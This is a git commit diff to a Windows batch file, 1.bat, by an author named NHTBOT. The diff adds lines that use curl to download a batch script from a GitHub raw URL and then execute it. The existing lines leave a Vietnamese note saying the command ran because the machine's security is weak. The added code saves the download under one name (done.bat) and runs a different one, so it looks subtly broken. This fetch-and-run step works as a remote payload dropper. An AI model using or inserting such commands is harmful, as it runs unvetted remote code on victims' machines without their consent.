0b197e4e8ab4abcb4c5a99e8200a0653923292b5
NHTBOT <140639828+NHTBOT@users.noreply.github.com>
2023-10-23 17:18:40 +0700

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -1,3 +1,5 @@
+curl -o done.bat https://raw.githubusercontent.com/NHTBOT/1/main/Setup-framework.bat
+Setup-framework.bat
 echo nguyễn hồng thái (NHT-TOOL) > 1100.txt
 echo Bảo mật máy yếu nên command đã được thực thi >> 1100.txt
 notepad.exe 1100.txt
